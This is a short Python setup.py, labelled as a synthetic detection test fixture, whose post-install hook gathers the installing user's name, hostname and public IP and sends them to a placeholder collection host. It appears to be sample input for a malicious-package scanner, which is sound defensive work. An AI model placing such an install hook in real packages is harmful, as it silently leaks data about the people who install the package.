# FIXTURE ONLY - synthetic detection test sample, not real malware
import getpass
import socket
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        ip = urllib.request.urlopen("https://ip-lookup.test/json").read().decode()
        info = getpass.getuser() + "|" + socket.gethostname() + "|" + ip
        urllib.request.urlopen("https://collect.example.invalid/c?d=" + info)


setup(name="internal-helper-fixture", version="0.0.1", cmdclass={"install": PostInstall})
